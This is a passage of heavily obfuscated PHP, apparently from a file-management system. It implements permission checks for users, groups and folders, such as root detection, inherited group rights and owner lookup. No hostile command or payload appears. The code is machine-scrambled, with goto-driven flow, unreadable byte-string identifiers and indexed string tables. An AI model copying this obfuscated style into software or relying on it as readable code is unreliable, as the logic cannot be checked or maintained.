$fØ‘ˆˆ¹¢Õ->parentLevelArray($E—ïÚÃÑš¾[$bĞóšô²Şç[496]]); $FàÆ£Á¶ˆØ = array_merge($FàÆ£Á¶ˆØ, array($BéÃÇ¢¿íÁ), array_reverse($e¬—Ğ´ï¢Ì)); } $FàÆ£Á¶ˆØ = array_values(array_unique($FàÆ£Á¶ˆØ)); if (!$FàÆ£Á¶ˆØ) { return array(); } goto D¨¾†ÁöËñ; c£Œ½ŒÑˆ: $E­÷³„ïĞ– = array(); foreach ($b×æ„‡ãó÷ as $c–ßÂÛ‘ => $Fâ‡ÉÛ¯ƒİ) { if ($C•µÉáÀÚ®) { $E­÷³„ïĞ–[$c–ßÂÛ‘] = $Aƒ˜É¨Ñ¡ï; continue; } $E­÷³„ïĞ–[$c–ßÂÛ‘] = $this->makeSourceAuth($Fâ‡ÉÛ¯ƒİ, $c…Š¯®í‰ô, $F„İÏÎÓÚé); } return $E­÷³„ïĞ–; goto bö¥‡ÁßŠ®; d×Ü¢ÂÑ: $bĞóšô²Şç =& $_SERVER[«¾°Ã¤]; if (!$e‹ÖØŞÏÆ£) { return array(); } $fØ‘ˆˆ¹¢Õ = Model($bĞóšô²Şç[1207]); goto c¦Šê¬•ÍÍ; CÃî”Ÿ…ˆÅ: $C•µÉáÀÚ® = $this->userIsRoot($F„İÏÎÓÚé); $bæ×¡õÜÄ = AuthModel::authAll(); $Aƒ˜É¨Ñ¡ï = array($bĞóšô²Şç[416] => $bæ×¡õÜÄ, $bĞóšô²Şç[1869] => array($bĞóšô²Şç[421] => 0, $bĞóšô²Şç[1699] => $bæ×¡õÜÄ, $bĞóšô²Şç[422] => LNG($bĞóšô²Şç[1870]), $bĞóšô²Şç[1714] => $bĞóšô²Şç[1871])); goto c£Œ½ŒÑˆ; D¨¾†ÁöËñ: $aä –Öêœ = $this->sourceAuthSelect($FàÆ£Á¶ˆØ); $c…Š¯®í‰ô = array(); foreach ($FàÆ£Á¶ˆØ as $c–ßÂÛ‘) { if (isset($aä –Öêœ[$c–ßÂÛ‘])) { $c…Š¯®í‰ô[$c–ßÂÛ‘] = $aä –Öêœ[$c–ßÂÛ‘]; } } goto CÃî”Ÿ…ˆÅ; c¦Šê¬•ÍÍ: if (!$b×æ„‡ãó÷ && count($e‹ÖØŞÏÆ£) == 1) { $b×æ„‡ãó÷ = array(); $b×æ„‡ãó÷[$e‹ÖØŞÏÆ£[0]] = $fØ‘ˆˆ¹¢Õ->sourceInfo($e‹ÖØŞÏÆ£[0]); } if (!$b×æ„‡ãó÷) { $cæ¥‹š™ = array($bĞóšô²Şç[419] => array($bĞóšô²Şç[420], $e‹ÖØŞÏÆ£)); $b×æ„‡ãó÷ = $fØ‘ˆˆ¹¢Õ->field($bĞóšô²Şç[1868])->where($cæ¥‹š™)->select(); $b×æ„‡ãó÷ = array_to_keyvalue($b×æ„‡ãó÷, $bĞóšô²Şç[404]); } $FàÆ£Á¶ˆØ = $e‹ÖØŞÏÆ£; goto FøÄğèœº–; bö¥‡ÁßŠ®: } public function authDeepCheck($c©ˆª…§•ª, $cºáãøŠË‚ = false) { goto B»ìÔ±Ë¿; a´ÒÔÇ¯„: if (!in_array($c©ˆª…§•ª, $aï¯©ØÖ[$Fó¡ÚÂœ[1872]])) { return !1; } $aÔÉò×˜À = array(); foreach ($aï¯©ØÖ[$Fó¡ÚÂœ[1873]] as $CÖ‡ùØ§ôç => $aÓ¸‹È‹¾¤) { if (!in_array($c©ˆª…§•ª, $aÓ¸‹È‹¾¤)) { continue; } $aÔÉò×˜À[] = $CÖ‡ùØ§ôç; } goto fÈ‹Šæ¬Òï; B»ìÔ±Ë¿: $Fó¡ÚÂœ =& $_SERVER[«¾°Ã¤]; $cºáãøŠË‚ = $cºáãøŠË‚ ? $cºáãøŠË‚ : USER_ID; $aï¯©ØÖ = $this->makeAuthDeep($cºáãøŠË‚); goto a´ÒÔÇ¯„; fÈ‹Šæ¬Òï: if (!$aÔÉò×˜À) { return !1; } $A³Ïö¿ï‘ = $aÔÉò×˜À ? $aÔÉò×˜À[0] : $c©ˆª…§•ª; return array($Fó¡ÚÂœ[416] => -1, $Fó¡ÚÂœ[455] => array($Fó¡ÚÂœ[421] => $Fó¡ÚÂœ[1086], $Fó¡ÚÂœ[1699] => $Fó¡ÚÂœ[191], $Fó¡ÚÂœ[422] => LNG($Fó¡ÚÂœ[1874]), $Fó¡ÚÂœ[1714] => $Fó¡ÚÂœ[1875]), $Fó¡ÚÂœ[1876] => LNG($Fó¡ÚÂœ[1877]), $Fó¡ÚÂœ[1878] => $this->sourceAuthInfo($A³Ïö¿ï‘)); goto d¸–’ÍÏ†„; d¸–’ÍÏ†„: } protected function makeAuthDeep($b–É™áƒ¨™ = false) { goto a¥ñÀ¯™çŠ; E„Ù‚íœ›: if ($aôË“çå‹) { $eíò†Â·ù = array(array($F¼ëİ›ù‰¡[413] => SourceModel::TYPE_USER, $F¼ëİ›ù‰¡[493] => $b–É™áƒ¨™), array($F¼ëİ›ù‰¡[413] => SourceModel::TYPE_GROUP, $F¼ëİ›ù‰¡[493] => array($F¼ëİ›ù‰¡[420], $aôË“çå‹)), $F¼ëİ›ù‰¡[958] => $F¼ëİ›ù‰¡[1780]); } $f÷÷Ôáà™Ì = $this->field($F¼ëİ›ù‰¡[1880])->where($eíò†Â·ù)->select(); $C¸Ô±ÎÆ÷³ = array(); goto eÒƒæ¸ÒšÑ; dÍˆ¦ãÓ‘“: foreach ($fØ¼í÷™ã« as $aÕÛ»Í¹›) { if ($aÕÛ»Í¹›[$F¼ëİ›ù‰¡[415]] == 0 && $aÕÛ»Í¹›[$F¼ëİ›ù‰¡[1715]] == $F¼ëİ›ù‰¡[87]) { $A±äÊÙ¼ë¥[] = $aÕÛ»Í¹›[$F¼ëİ›ù‰¡[393]]; } } $aôË“çå‹ = $this->userGroupParents($b–É™áƒ¨™); $eíò†Â·ù = array($F¼ëİ›ù‰¡[413] => SourceModel::TYPE_USER, $F¼ëİ›ù‰¡[493] => $b–É™áƒ¨™); goto E„Ù‚íœ›; bâÅØ¬”Â: $aˆˆŞÆØ = array(); if ($C¸Ô±ÎÆ÷³) { $C´¾Ï­ã‹” = $c—›¢˜ø á->where(array($F¼ëİ›ù‰¡[404] => array($F¼ëİ›ù‰¡[420], $C¸Ô±ÎÆ÷³)))->select(); foreach ($C´¾Ï­ã‹” as $eõ—à”¨¯) { $DåÄ´ç¨‰Å = $c—›¢˜ø á->parentLevelArray($eõ—à”¨¯[$F¼ëİ›ù‰¡[496]]); $b•©¬¬­ = array_merge($b•©¬¬­, $DåÄ´ç¨‰Å); $DÂëÏøğ[] = $eõ—à”¨¯[$F¼ëİ›ù‰¡[493]]; $D¦á‰åøÎ[$eõ—à”¨¯[$F¼ëİ›ù‰¡[404]]] = $DåÄ´ç¨‰Å; $b…–§àë…ì[$eõ—à”¨¯[$F¼ëİ›ù‰¡[404]]] = $eõ—à”¨¯[$F¼ëİ›ù‰¡[493]]; } } $DÂëÏøğ = array_values(array_unique($DÂëÏøğ)); goto Cˆ¸ ì×Ö; AÂŒîñ•İ‘: $D¦á‰åøÎ = array(); $b…–§àë…ì = array(); $Eìêø•é² = array(); goto bâÅØ¬”Â; A»†ß»ô‘…: $E½İ¾ÜĞÏš = array($F¼ëİ›ù‰¡[1872] => $b•©¬¬­, $F¼ëİ›ù‰¡[1873] => $D¦á‰åøÎ); $dÇéáÍÁá[$b–É™áƒ¨™] = $E½İ¾ÜĞÏš; return $E½İ¾ÜĞÏš; goto BëËÂ™…¾ó; Cˆ¸ ì×Ö: $BÈ­ë»Ğİ = $DÂëÏøğ; foreach ($BÈ­ë»Ğİ as $FŠ‹š—ó®) { $cˆ¾¹‰§ = $dº¿Çƒ·èã->getInfo($FŠ‹š—ó®); $DåÄ´ç¨‰Å = $c—›¢˜ø á->parentLevelArray($cˆ¾¹‰§[$F¼ëİ›ù‰¡[496]]); $DÂëÏøğ = array_merge($DÂëÏøğ, $DåÄ´ç¨‰Å); } $DÂëÏøğ = array_values(array_unique($DÂëÏøğ)); goto c‹·†œÒÄ; f¿ŠÅ²‡¼¡: $DÂëÏøğ = $aôË“çå‹; $c—›¢˜ø á = Model($F¼ëİ›ù‰¡[1207]); $dº¿Çƒ·èã = Model($F¼ëİ›ù‰¡[495]); goto AÂŒîñ•İ‘; c‹·†œÒÄ: foreach ($DÂëÏøğ as $FŠ‹š—ó®) { $cˆ¾¹‰§ = $dº¿Çƒ·èã->getInfo($FŠ‹š—ó®); $b•©¬¬­[] = $cˆ¾¹‰§[$F¼ëİ›ù‰¡[85]][$F¼ëİ›ù‰¡[404]]; $Eìêø•é²[$FŠ‹š—ó®] = $cˆ¾¹‰§[$F¼ëİ›ù‰¡[85]][$F¼ëİ›ù‰¡[404]]; $aˆˆŞÆØ[$FŠ‹š—ó®] = $c—›¢˜ø á->parentLevelArray($cˆ¾¹‰§[$F¼ëİ›ù‰¡[496]]); } foreach ($D¦á‰åøÎ as $b„­çŠ³ß´ => $eëÈîì÷Õğ) { $C‚„âôÃÑ‡ = $b…–§àë…ì[$b„­çŠ³ß´]; if (!$C‚„âôÃÑ‡ || !$Eìêø•é²[$C‚„âôÃÑ‡]) { continue; } $eÕ”Ï¶½Å¨ = array(); foreach ($aˆˆŞÆØ[$C‚„âôÃÑ‡] as $FŠ‹š—ó®) { $eÕ”Ï¶½Å¨[] = $Eìêø•é²[$FŠ‹š—ó®]; } $D¦á‰åøÎ[$b„­çŠ³ß´] = array_merge($eÕ”Ï¶½Å¨, $eëÈîì÷Õğ); } $b•©¬¬­ = array_values(array_unique($b•©¬¬­)); goto A»†ß»ô‘…; F÷ÍÜ‚Û: if (isset($dÇéáÍÁá[$b–É™áƒ¨™])) { return $dÇéáÍÁá[$b–É™áƒ¨™]; } $fØ¼í÷™ã« = Model($F¼ëİ›ù‰¡[1879])->listData(); $A±äÊÙ¼ë¥ = array(); goto dÍˆ¦ãÓ‘“; a¥ñÀ¯™çŠ: $F¼ëİ›ù‰¡ =& $_SERVER[«¾°Ã¤]; static $dÇéáÍÁá = array(); $b–É™áƒ¨™ = $b–É™áƒ¨™ ? $b–É™áƒ¨™ : USER_ID; goto F÷ÍÜ‚Û; eÒƒæ¸ÒšÑ: $b‚‹ù æ¡Í = array_to_keyvalue_group($f÷÷Ôáà™Ì, $F¼ëİ›ù‰¡[404]); foreach ($b‚‹ù æ¡Í as $fôá³å´× => $A—–òìÏ) { $f´¢ºÎˆ¢ = $this->authArrayCheck($A—–òìÏ, $b–É™áƒ¨™); if ($f´¢ºÎˆ¢[$F¼ëİ›ù‰¡[416]] > 0) { $C¸Ô±ÎÆ÷³[] = $fôá³å´× . $F¼ëİ›ù‰¡[33]; } } $b•©¬¬­ = array(); goto f¿ŠÅ²‡¼¡; BëËÂ™…¾ó: } private function makeSourceAuth($d¬ëÅ±öÉ, $cøß‹½ë»ñ, $EÌ’Ï‰ëº = false) { goto bòàÏœßİ; bòàÏœßİ: $dÙ›…èÒ«ã =& $_SERVER[«¾°Ã¤]; $ešèôíğ÷† = $dÙ›…èÒ«ã[87]; $B•ë¼Œõˆ = $d¬ëÅ±öÉ[$dÙ›…èÒ«ã[493]]; goto F›‰ªÏÖ¾; F›‰ªÏÖ¾: $dŞµ«Ó«Âø = $d¬ëÅ±öÉ[$dÙ›…èÒ«ã[413]] == SourceModel::TYPE_GROUP; $e‰Şò‹¤çë = $dŞµ«Ó«Âø ? $this->groupRootAuth($B•ë¼Œõˆ, $EÌ’Ï‰ëº) : !1; if ($e‰Şò‹¤çë && Model($dÙ›…èÒ«ã[1860])->authCheckAction($e‰Şò‹¤çë[$dÙ›…èÒ«ã[415]], $dÙ›…èÒ«ã[1713])) { return $this->groupAuthInfo($e‰Şò‹¤çë, $B•ë¼Œõˆ); } goto cğË’ÈÅÓ; F×Ó¹Ö¼Ë: if (!$C‘¥ºõ¢º) { $b¥ÅÍš˜ï† = Model($dÙ›…èÒ«ã[495])->getInfo($B•ë¼Œõˆ); $c¤ëò·»·İ = explode($dÙ›…èÒ«ã[47], trim($b¥ÅÍš˜ï†[$dÙ›…èÒ«ã[496]], $dÙ›…èÒ«ã[47])); $c¤ëò·»·İ = array_reverse($c¤ëò·»·İ); foreach ($c¤ëò·»·İ as $B…·äÁæÜ) { if ($B…·äÁæÜ == $dÙ›…èÒ«ã[191] || $B…·äÁæÜ == $ešèôíğ÷†) { continue; } $E·˜³©À£™ = $this->groupRootAuth($B…·äÁæÜ, $EÌ’Ï‰ëº); if (!$E·˜³©À£™) { continue; } $C‘¥ºõ¢º = $this->groupAuthInfo($E·˜³©À£™, $B…·äÁæÜ); break; } } if (!$C‘¥ºõ¢º || $C‘¥ºõ¢º[$dÙ›…èÒ«ã[416]] <= 0) { $BÁÅåˆÄ = $this->authDeepCheck($d¬ëÅ±öÉ[$dÙ›…èÒ«ã[404]], $EÌ’Ï‰ëº); if ($BÁÅåˆÄ) { $C‘¥ºõ¢º = $BÁÅåˆÄ; } } return $C‘¥ºõ¢º; goto e££ãºÑ”¹; f“ùšâÀâÔ: foreach ($EÑÍ…ææË as $D÷­¦ééöÅ) { if (!isset($cøß‹½ë»ñ[$D÷­¦ééöÅ])) { continue; } $cŠ“º–Åï = $this->authMake($cøß‹½ë»ñ[$D÷­¦ééöÅ], $EÌ’Ï‰ëº); if ($cŠ“º–Åï[$dÙ›…èÒ«ã[455]]) { $C‘¥ºõ¢º = $cŠ“º–Åï; break; } } if (!$dŞµ«Ó«Âø) { return $C‘¥ºõ¢º; } if (!$C‘¥ºõ¢º && $e‰Şò‹¤çë) { $C‘¥ºõ¢º = $this->groupAuthInfo($e‰Şò‹¤çë, $B•ë¼Œõˆ); } goto F×Ó¹Ö¼Ë; cğË’ÈÅÓ: $EÑÍ…ææË = Model($dÙ›…èÒ«ã[1207])->parentLevelArray($d¬ëÅ±öÉ[$dÙ›…èÒ«ã[496]]); $EÑÍ…ææË = array_merge(array($d¬ëÅ±öÉ[$dÙ›…èÒ«ã[404]]), array_reverse($EÑÍ…ææË)); $C‘¥ºõ¢º = !1; goto f“ùšâÀâÔ; e££ãºÑ”¹: } private function userIsRoot($c­ˆˆ£åÀÃ = false) { $Bøœ¯“›—ˆ =& $_SERVER[«¾°Ã¤]; if (!$c­ˆˆ£åÀÃ && _get($GLOBALS, $Bøœ¯“›—ˆ[494])) { return !0; } $DŒ‚Ì®°İ¦ = Model($Bøœ¯“›—ˆ[515])->getInfo($c­ˆˆ£åÀÃ); $aì«ŞÀ‰ = Model($Bøœ¯“›—ˆ[1881])->listData($DŒ‚Ì®°İ¦[$Bøœ¯“›—ˆ[1413]]); if ($aì«ŞÀ‰ && $aì«ŞÀ‰[$Bøœ¯“›—ˆ[1284]][$Bøœ¯“›—ˆ[1882]] == 1) { return !0; } return !1; } private function sourceAuthInfo($E„¦îÍ…•) { goto c¼„’ÏÙ¹; d¡µßõÁ†ç: if (isset($cĞ“¬Ü¬ô[$céÇ™ÚğÀÛ[501]])) { $a¾è¡»±ˆ = explode($céÇ™ÚğÀÛ[8], trim($cĞ“¬Ü¬ô[$céÇ™ÚğÀÛ[504]], $céÇ™ÚğÀÛ[8])); array_shift($a¾è¡»±ˆ); $A¦÷ˆ„½ÁÇ = $cĞ“¬Ü¬ô[$céÇ™ÚğÀÛ[499]] . $céÇ™ÚğÀÛ[1883] . implode($céÇ™ÚğÀÛ[8], $a¾è¡»±ˆ); } return array($céÇ™ÚğÀÛ[422] => $cĞ“¬Ü¬ô[$céÇ™ÚğÀÛ[28]], $céÇ™ÚğÀÛ[76] => KodIO::make($cĞ“¬Ü¬ô[$céÇ™ÚğÀÛ[404]]), $céÇ™ÚğÀÛ[1884] => $A¦÷ˆ„½ÁÇ); goto DÃè Åè‘; c¼„’ÏÙ¹: $céÇ™ÚğÀÛ =& $_SERVER[«¾°Ã¤]; $d¯íŞ×™õ = Model($céÇ™ÚğÀÛ[1207]); $cĞ“¬Ü¬ô = $d¯íŞ×™õ->sourceInfo($E„¦îÍ…•); goto F¼ˆëœ˜¤; F¼ˆëœ˜¤: if (!$cĞ“¬Ü¬ô) { return !1; } $d¯íŞ×™õ->groupPathDisplay($cĞ“¬Ü¬ô); $cªôíğè™ = array($cĞ“¬Ü¬ô); goto cìœ¯Ú»; cìœ¯Ú»: $cªôíğè™ = $d¯íŞ×™õ->_listAppendPath($cªôíğè™); $cĞ“¬Ü¬ô = $cªôíğè™[0]; $A¦÷ˆ„½ÁÇ = $cĞ“¬Ü¬ô[$céÇ™ÚğÀÛ[504]]; goto d¡µßõÁ†ç; DÃè Åè‘: } private function groupAuthInfo($bÍ™»îØİ‹, $cƒ‡ä·Ûê) { $fÕ‡âë»½ =& $_SERVER[«¾°Ã¤]; $D ÷•ÚšÛâ = Model($fÕ‡âë»½[495])->getInfo($cƒ‡ä·Ûê); return array($fÕ‡âë»½[1885] => intval($bÍ™»îØİ‹[$fÕ‡âë»½[415]]), $fÕ‡âë»½[1869] => $bÍ™»îØİ‹, $fÕ‡âë»½[1886] => LNG($fÕ‡âë»½[1887]), $fÕ‡âë»½[1878] => array($fÕ‡âë»½[422] => $D ÷•ÚšÛâ[$fÕ‡âë»½[28]], $fÕ‡âë»½[76] => KodIO::make($D ÷•ÚšÛâ[$fÕ‡âë»½[85]][$fÕ‡âë»½[404]]), $fÕ‡âë»½[1884] => $D ÷•ÚšÛâ[$fÕ‡âë»½[500]])); } protected function groupRootAuth($e¢‚È«¾œ, $Bê¯°¶…¿ = false) { goto f£Ÿ‰Ìäå¹; Bº¡ÑÓ¤â¤: static $D·…¬‚­ÜŠ = array(); if (isset($D·…¬‚­ÜŠ[$aõİ¢ø†„î])) { return $D·…¬‚­ÜŠ[$aõİ¢ø†„î]; } $a‘â«áæ„· = Model($EïÑš¯âÆ™[495])->getInfo($e¢‚È«¾œ); goto aª¥ªíÇç¶; aª¥ªíÇç¶: $BŠÎÍùõÒ = $this->userGroupList($Bê¯°¶…¿); $eá¨èÚ±°  = isset($BŠÎÍùõÒ[$e¢‚È«¾œ]) ? $BŠÎÍùõÒ[$e¢‚È«¾œ][$EïÑš¯âÆ™[415]] : !1; if ($eá¨èÚ±°  && Model($EïÑš¯âÆ™[1860])->authCheckAction($eá¨èÚ±° [$EïÑš¯âÆ™[415]], $EïÑš¯âÆ™[1713])) { $D·…¬‚­ÜŠ[$aõİ¢ø†„î] = $eá¨èÚ±° ; return $eá¨èÚ±° ; } goto BŠ×›‘„°’; E¿‡Ü„‡: $D·…¬‚­ÜŠ[$aõİ¢ø†„î] = $EèÈêæêÓõ ? $EèÈêæêÓõ : $eá¨èÚ±° ; return $D·…¬‚­ÜŠ[$aõİ¢ø†„î]; goto dçÚ¥ŸªË; BŠ×›‘„°’: $cÇçØµù× = $this->sourceAuthSelect($a‘â«áæ„·[$EïÑš¯âÆ™[85]][$EïÑš¯âÆ™[404]]); $D¬‡âùŒ¯¬ = $cÇçØµù× ? $this->authMake($cÇçØµù×, $Bê¯°¶…¿) : !1; $EèÈêæêÓõ = $D¬‡âùŒ¯¬ ? $D¬‡âùŒ¯¬[$EïÑš¯âÆ™[455]] : !1; goto E¿‡Ü„‡; f£Ÿ‰Ìäå¹: $EïÑš¯âÆ™ =& $_SERVER[«¾°Ã¤]; $Bê¯°¶…¿ = $Bê¯°¶…¿ ? $Bê¯°¶…¿ : USER_ID; $aõİ¢ø†„î = $Bê¯°¶…¿ . $EïÑš¯âÆ™[1888] . $e¢‚È«¾œ; goto Bº¡ÑÓ¤â¤; dçÚ¥ŸªË: } public function authOwnerApply($CÓîÆãò‚æ) { goto eñ…ĞÉµ›¿; Cêİèø±Ì§: $CÓîÆãò‚æ[$aŸ¼ÍÚ²ª£[415]][$aŸ¼ÍÚ²ª£[1891]] = Model($aŸ¼ÍÚ²ª£[511])->userListInfo($DÎ¯å¡ÆÖ); return $CÓîÆãò‚æ; goto AéŠŒ–àë®; d’×ØĞùÍÀ: if (count($DÎ¯å¡ÆÖ) == 0) { $DÎ¯å¡ÆÖ = $this->authFolderOwnerGroup($CÓîÆãò‚æ[$aŸ¼ÍÚ²ª£[493]]); } $DÎ¯å¡ÆÖ = array_unique($DÎ¯å¡ÆÖ); if (AuthModel::authCheckRoot($CÓîÆãò‚æ[$aŸ¼ÍÚ²ª£[415]][$aŸ¼ÍÚ²ª£[416]])) { $DÎ¯å¡ÆÖ[] = USER_ID; } goto Cêİèø±Ì§; Cå†ùÑë˜: $eÆç¿ÇÀ§ = array(); $DÎ¯å¡ÆÖ = array(); foreach ($A¶†ø§¡î as $A’Ÿ¸¬Ä˜Å => $dÖµ“ âÀ) { $EÒ‚Ö±’ã  = $this->authFolderOwnerUser($dÖµ“ âÀ); $eÆç¿ÇÀ§[$A’Ÿ¸¬Ä˜Å] = $EÒ‚Ö±’ã ; $DÎ¯å¡ÆÖ = array_merge($DÎ¯å¡ÆÖ, $EÒ‚Ö±’ã [$aŸ¼ÍÚ²ª£[571]]); if ($EÒ‚Ö±’ã [$aŸ¼ÍÚ²ª£[1890]]) { break; } } goto d’×ØĞùÍÀ; eñ…ĞÉµ›¿: $aŸ¼ÍÚ²ª£ =& $_SERVER[«¾°Ã¤]; if (empty($CÓîÆãò‚æ[$aŸ¼ÍÚ²ª£[415]]) || isset($CÓîÆãò‚æ[$aŸ¼ÍÚ²ª£[1889]]) && $CÓîÆãò‚æ[$aŸ¼ÍÚ²ª£[1889]]) { return $CÓîÆãò‚æ; } if (AuthModel::authCheckRoot($CÓîÆãò‚æ[$aŸ¼ÍÚ²ª£[415]][$aŸ¼ÍÚ²ª£[416]])) { return $CÓîÆãò‚æ; } goto d¢÷ô¨ ­; d¢÷ô¨ ­: $e›—Äƒ½Ğ† = Model($aŸ¼ÍÚ²ª£[1207])->parentLevelArray($CÓîÆãò‚æ[$aŸ¼ÍÚ²ª£[496]]); $e›—Äƒ½Ğ† = array_merge(array($CÓîÆãò‚æ[$aŸ¼ÍÚ²ª£[404]]), array_reverse($e›—Äƒ½Ğ†)); $A¶†ø§¡î = $this->sourceAuthSelect($e›—Äƒ½Ğ†); goto Cå†ùÑë˜; AéŠŒ–àë®: } private function authFolderOwnerGroup($Bò„¿ç—¼) { $c‹„Ó…œí =& $_SERVER[«¾°Ã¤]; $b¢˜¡…ËÈã = Model($c‹„Ó…œí[1774])->where(array($c‹„Ó…œí[1693] => $Bò„¿ç—¼))->select(); $A®öšŒŒ¥¿ = array(); if (!$b¢˜¡…ËÈã) { return $A®öšŒŒ¥¿; } foreach ($b¢˜¡…ËÈã as $C» éçÚ›…) { $AˆÛ½ĞµÉ™ = $this->authInfo($C» éçÚ›…); if (AuthModel::authCheckRoot($AˆÛ½ĞµÉ™[$c‹„Ó…œí[415]])) { $A®öšŒŒ¥¿[] = $C» éçÚ›…[$c‹„Ó…œí[1529]]; } } return $A®öšŒŒ¥¿; } private function authFolderOwnerUser($Aâ°«±‘ ƒ) { $DÚ¦ÓÍ—ç× =& $_SERVER[«¾°Ã¤]; $D¢»Ëƒ†„Í = array(); $B´Ó¼àäÛÌ = !1; foreach ($Aâ°«±‘ ƒ as $dƒ–³±™Í) { $eœ²£ô‡ = $this->authInfo($dƒ–³±™Í); if ($dƒ–³±™Í[$DÚ¦ÓÍ—ç×[493]] == $DÚ¦ÓÍ—ç×[191]) { $B´Ó¼àäÛÌ = !0; } if ($dƒ–³±™Í[$DÚ¦ÓÍ—ç×[413]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($eœ²£ô‡[$DÚ¦ÓÍ—ç×[415]])) { $D¢»Ëƒ†„Í[] = $dƒ–³±™Í[$DÚ¦ÓÍ—ç×[493]]; } } } return array($DÚ¦ÓÍ—ç×[571] => $D¢»Ëƒ†„Í, $DÚ¦ÓÍ—ç×[1890] => $B´Ó¼àäÛÌ); } public function authMake($CÌæˆµÇå, $CÛ®ˆ¢ˆ¸¹ = false) { $aãå’‡ßÄ‹ =& $_SERVER[«¾°Ã¤]; $fëƒ“º¹†“ = $this->authArrayCheck($CÌæˆµÇå, $CÛ®ˆ¢ˆ¸¹); if ($fëƒ“º¹†“[$aãå’‡ßÄ‹[1892]]) { $fëƒ“º¹†“[$aãå’‡ßÄ‹[1892]] = $this->sourceAuthInfo($fëƒ“º¹†“[$aãå’‡ßÄ‹[1892]]); } return $fëƒ“º¹†“; } public function authArrayCheck($bÇÀìÄîœ, $aÑ´‹ë‚Â = false) { goto dß•÷…‰Ê; dÏ™¹ß¼à: $c¡–ÚÃÂ® = 1000; $d†¬¥Á®‰© = 0; $cÈ×šÅÎ©ô = 0; goto f™Şµƒ›¬‰; dß•÷…‰Ê: $e„ƒƒ­‚¡· =& $_SERVER[«¾°Ã¤]; if (!$bÇÀìÄîœ) { return array($e„ƒƒ­‚¡·[416] => 0, $e„ƒƒ­‚¡·[455] => !1); } $aÑ´‹ë‚Â = $aÑ´‹ë‚Â ? $aÑ´‹ë‚Â : USER_ID; goto B‚…ÎÙÍ®ë; f™Şµƒ›¬‰: $d­‚¸á œˆ = 0; $F‡Ë•¸Ñ¿ = 0; $aŒËéÌÕÄÀ = array($e„ƒƒ­‚¡·[404] => 0); goto C²ÈÌù¹©›; B‚…ÎÙÍ®ë: $B©ã°¨Úëƒ = 0; $C¸ìæ‘İ„¢ = 0; $D‘–ƒºìá = 0; goto Dá ¤Áª†¢; aŠ¼ŠÆÁ¾à: return $e¢àŒˆ©Æ²; goto D™ÒĞ®”À; Dá ¤Áª†¢: $A†®‡¢ÖËÆ = 0; $dĞæœ’ù¼ = 0; $c¨ä†´š£ = 0; goto dÏ™¹ß¼à; C²ÈÌù¹©›: foreach ($bÇÀìÄîœ as $aŒËéÌÕÄÀ) { $c‹á³éÔÊ = $this->authInfo($aŒËéÌÕÄÀ); if (!$c‹á³éÔÊ) { continue; } $c ¼´¹¬¿ = $aŒËéÌÕÄÀ[$e„ƒƒ­‚¡·[493]]; $Eİ“ù›Íá = intval($c‹á³éÔÊ[$e„ƒƒ­‚¡·[415]]); if ($aŒËéÌÕÄÀ[$e„ƒƒ­‚¡·[413]] == SourceModel::TYPE_USER && $c ¼´¹¬¿ == $aÑ´‹ë‚Â) { $B©ã°¨Úëƒ = !0; $D‘–ƒºìá = $c‹á³éÔÊ; $C¸ìæ‘İ„¢ = $Eİ“ù›Íá; } else { if ($aŒËéÌÕÄÀ[$e„ƒƒ­‚¡·[413]] == SourceModel::TYPE_GROUP && $this->groupContainUser($c ¼´¹¬¿, $aÑ´‹ë‚Â)) { $A†®‡¢ÖËÆ = !0; $F‡‰«‘ˆ¸ô = $this->groupStepToUserGroup($c ¼´¹¬¿, $aÑ´‹ë‚Â); if ($F‡‰«‘ˆ¸ô < $c¡–ÚÃÂ®) { $c¡–ÚÃÂ® = $F‡‰«‘ˆ¸ô; $dĞæœ’ù¼ = $Eİ“ù›Íá; $c¨ä†´š£ = $c‹á³éÔÊ; $d†¬¥Á®‰© = $c ¼´¹¬¿; } if ($F‡‰«‘ˆ¸ô == $c¡–ÚÃÂ® && $Eİ“ù›Íá >= $dĞæœ’ù¼) { $dĞæœ’ù¼ = $Eİ“ù›Íá; $c¨ä†´š£ = $c‹á³éÔÊ; $d†¬¥Á®‰© = $c ¼´¹¬¿; } } else { if ($c ¼´¹¬¿ == $e„ƒƒ­‚¡·[191]) { $cÈ×šÅÎ©ô = !0; $F‡Ë•¸Ñ¿ = $c‹á³éÔÊ; $d­‚¸á œˆ = $Eİ“ù›Íá; } } } } if ($B©ã°¨Úëƒ) { $f¡ ƒ‡ß¸ = $C¸ìæ‘İ„¢; $c‹á³éÔÊ = $D‘–ƒºìá; $C‹…Ø«¼‡Ü = LNG($e„ƒƒ­‚¡·[1893]); } else { if ($A†®‡¢ÖËÆ) { $f¡ ƒ‡ß¸ = $dĞæœ’ù¼; $c‹á³éÔÊ = $c¨ä†´š£; $A±ğËéëØª = Model($e„ƒƒ­‚¡·[495])->getInfo($d†¬¥Á®‰©); $C‹…Ø«¼‡Ü = $e„ƒƒ­‚¡·[160] . $A±ğËéëØª[$e„ƒƒ­‚¡·[500]] . $e„ƒƒ­‚¡·[1894] . LNG($e„ƒƒ­‚¡·[1895]); } else { if ($cÈ×šÅÎ©ô) { $f¡ ƒ‡ß¸ = $d­‚¸á œˆ; $c‹á³éÔÊ = $F‡Ë•¸Ñ¿; $C‹…Ø«¼‡Ü = LNG($e„ƒƒ­‚¡·[1866]); } else { $f¡ ƒ‡ß¸ = 0; $c‹á³éÔÊ = !1; $C‹…Ø«¼‡Ü = $e„ƒƒ­‚¡·[33]; } } } $e¢àŒˆ©Æ² = array($e„ƒƒ­‚¡·[1885] => intval($f¡ ƒ‡ß¸), $e„ƒƒ­‚¡·[1869] => $c‹á³éÔÊ, $e„ƒƒ­‚¡·[1886] => $C‹…Ø«¼‡Ü, $e„ƒƒ­‚¡·[1878] => $aŒËéÌÕÄÀ[$e„ƒƒ­‚¡·[404]]); goto aŠ¼ŠÆÁ¾à; D™ÒĞ®”À: } private function groupContainUser($b‡¿´ç…ˆè, $DÀ²Çš„´Œ = false) { return in_array($b‡¿´ç…ˆè, $this->userGroupParents($DÀ²Çš„´Œ)); } private function groupStepToUserGroup($fµôÂ‘œ¦½, $C–Æø®¢“ = false) { goto A¹¬¦‚ÙåÀ; Dº‰Í–ßò: $e¨ñ™¤¹­ = $GLOBALS[$bˆÉÊò™[6]][$bˆÉÊò™[88]][$bˆÉÊò™[1785]] == 1; $Bç½Î†åª° = $e¨ñ™¤¹­ ? 3 : 2; foreach ($EêÜ¤‘™Ûê as $e¤ğ¶´•½) { if ($e¤ğ¶´•½[$bˆÉÊò™[1693]] == $fµôÂ‘œ¦½) { return 0; } $fÚÈë„Èøñ = 